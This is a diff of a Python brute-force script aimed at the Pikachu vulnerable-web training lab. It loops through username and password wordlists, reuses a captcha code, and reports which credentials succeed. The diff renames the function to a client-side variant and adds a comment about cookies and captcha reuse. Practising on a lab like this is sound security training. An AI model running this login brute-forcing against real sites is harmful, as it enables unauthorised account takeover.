@@ -1,7 +1,10 @@
+'''
+需要添加Cookie。验证码可多次使用
+'''
 import re
 import requests
-url = "http://192.168.1.192:8086/pikachu/vul/burteforce/bf_server.php"
-def burteforce_server(url):
+
+def burteforce_client(url):
     with open('Web_Vulnerablility/burteforce/user.txt', 'r') as user:
         for username in user:
             with open('Web_Vulnerablility/burteforce/password.txt', 'r') as passwd:
@@ -14,10 +17,10 @@ def burteforce_server(url):
                         'username': username.strip(),
                         'password': password.strip(),
                         'submit': 'Login',
-                        'vcode': 'feijs7'  # 根据实际情况改动
+                        'vcode': 'OJEEP'  # 根据实际情况改动
                     }
                     res = requests.post(url=url, headers=header, data=data)
-                    if re.findall('login success', res.text) and url == url + '/vul/burteforce/bf_server.php':
+                    if re.findall('login success', res.text):
                         print('破解成功')
                         print("用户名是：", username.strip())
                         print("密码是：", password.strip())
